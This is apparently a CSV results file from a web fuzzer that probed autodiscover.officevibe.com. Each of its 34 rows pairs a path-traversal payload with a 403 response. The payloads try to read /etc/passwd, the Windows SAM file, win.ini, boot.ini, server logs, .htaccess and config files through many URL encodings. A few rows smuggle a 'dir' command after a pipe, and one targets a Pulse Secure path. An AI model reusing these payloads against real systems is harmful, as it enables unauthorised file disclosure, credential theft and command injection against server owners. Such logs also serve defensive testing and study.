FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
../config.inc.php,http://autodiscover.officevibe.com/../config.inc.php,,211520,403,312,17,7,text/html; charset=us-ascii,7.884569ms,
../manager/html,http://autodiscover.officevibe.com/../manager/html,,213723,403,312,17,7,text/html; charset=us-ascii,7.127983ms,
../../../../apache/logs/access.log,http://autodiscover.officevibe.com/../../../../apache/logs/access.log,,214776,403,312,17,7,text/html; charset=us-ascii,7.164549ms,
../admim,http://autodiscover.officevibe.com/../admim,,217845,403,312,17,7,text/html; charset=us-ascii,20.083826ms,
..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,http://autodiscover.officevibe.com/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,,218082,403,312,17,7,text/html; charset=us-ascii,13.886714ms,
../../../../logs/access.log,http://autodiscover.officevibe.com/../../../../logs/access.log,,222807,403,312,17,7,text/html; charset=us-ascii,10.841968ms,
js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,http://autodiscover.officevibe.com/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,224364,403,312,17,7,text/html; charset=us-ascii,6.944595ms,
"alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","http://autodiscover.officevibe.com/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,226017,403,312,17,7,text/html; charset=us-ascii,8.171982ms,
../../etc/passwd,http://autodiscover.officevibe.com/../../etc/passwd,,226249,403,312,17,7,text/html; charset=us-ascii,8.324383ms,
static/..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/static/..%5c..%5c..%5c..%5cetc/passwd,,226291,403,312,17,7,text/html; charset=us-ascii,7.717059ms,
//////../../../../../../etc/passwd,http://autodiscover.officevibe.com///////../../../../../../etc/passwd,,226989,403,312,17,7,text/html; charset=us-ascii,10.219438ms,
"cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","http://autodiscover.officevibe.com/cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,228125,403,312,17,7,text/html; charset=us-ascii,6.952349ms,
../../data/config/microsrv.cfg,http://autodiscover.officevibe.com/../../data/config/microsrv.cfg,,228343,403,312,17,7,text/html; charset=us-ascii,13.216699ms,
../../..//etc/passwd;index.html,http://autodiscover.officevibe.com/../../..//etc/passwd;index.html,,233973,403,312,17,7,text/html; charset=us-ascii,6.917819ms,
../..//etc/passwd;index.html,http://autodiscover.officevibe.com/../..//etc/passwd;index.html,,239233,403,312,17,7,text/html; charset=us-ascii,6.743451ms,
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,http://autodiscover.officevibe.com/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,,241360,403,312,17,7,text/html; charset=us-ascii,7.015049ms,
..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,243557,403,312,17,7,text/html; charset=us-ascii,10.37721ms,
../../../../../../../../../boot.ini,http://autodiscover.officevibe.com/../../../../../../../../../boot.ini,,245648,403,312,17,7,text/html; charset=us-ascii,7.333461ms,
../console,http://autodiscover.officevibe.com/../console,,250034,403,312,17,7,text/html; charset=us-ascii,6.827961ms,
../../windows/win.ini,http://autodiscover.officevibe.com/../../windows/win.ini,,253997,403,312,17,7,text/html; charset=us-ascii,7.105835ms,
../../../administrator/inbox,http://autodiscover.officevibe.com/../../../administrator/inbox,,255033,403,312,17,7,text/html; charset=us-ascii,7.826518ms,
static/..%5c..%5c..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/static/..%5c..%5c..%5c..%5c..%5cetc/passwd,,255283,403,312,17,7,text/html; charset=us-ascii,10.105074ms,
dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,http://autodiscover.officevibe.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,,258795,403,312,17,7,text/html; charset=us-ascii,7.611267ms,
../../../../logs/error.log,http://autodiscover.officevibe.com/../../../../logs/error.log,,259632,403,312,17,7,text/html; charset=us-ascii,10.305515ms,
../../.htaccess,http://autodiscover.officevibe.com/../../.htaccess,,263185,403,312,17,7,text/html; charset=us-ascii,10.068639ms,
..%5c..%5c..%5cetc/passwd,http://autodiscover.officevibe.com/..%5c..%5c..%5cetc/passwd,,263409,403,312,17,7,text/html; charset=us-ascii,11.848296ms,
../../../apache/logs/error.log,http://autodiscover.officevibe.com/../../../apache/logs/error.log,,265724,403,312,17,7,text/html; charset=us-ascii,7.002273ms,
../../../..//etc/passwd,http://autodiscover.officevibe.com/../../../..//etc/passwd,,266700,403,312,17,7,text/html; charset=us-ascii,6.846442ms,
../logs/access.log,http://autodiscover.officevibe.com/../logs/access.log,,270935,403,312,17,7,text/html; charset=us-ascii,7.643137ms,
DomainFiles/*//../../../../../../../../../../etc/passwd,http://autodiscover.officevibe.com/DomainFiles/*//../../../../../../../../../../etc/passwd,,273573,403,312,17,7,text/html; charset=us-ascii,7.427928ms,
../agc/bp.pl,http://autodiscover.officevibe.com/../agc/bp.pl,,276301,403,312,17,7,text/html; charset=us-ascii,14.213432ms,
../install.php,http://autodiscover.officevibe.com/../install.php,,279316,403,312,17,7,text/html; charset=us-ascii,6.738604ms,
./..//etc/passwd,http://autodiscover.officevibe.com/./..//etc/passwd,,281572,403,312,17,7,text/html; charset=us-ascii,11.128762ms,
.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,http://autodiscover.officevibe.com/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/var/www/html/index.html,,282407,403,312,17,7,text/html; charset=us-ascii,7.671529ms,
